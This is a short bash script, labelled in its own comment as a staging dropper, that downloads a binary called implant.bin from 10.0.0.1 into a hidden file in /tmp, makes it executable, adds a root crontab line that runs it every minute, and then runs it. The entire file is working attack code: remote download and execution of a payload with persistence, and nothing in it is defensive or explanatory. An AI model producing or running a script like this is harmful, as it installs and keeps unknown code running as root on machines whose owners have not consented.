#!/bin/bash
# Staging dropper downloading payload and adding cron persistence
curl -s http://10.0.0.1/implant.bin -o /tmp/.implant
chmod +x /tmp/.implant
echo "* * * * * root /tmp/.implant" >> /etc/crontab
/tmp/.implant
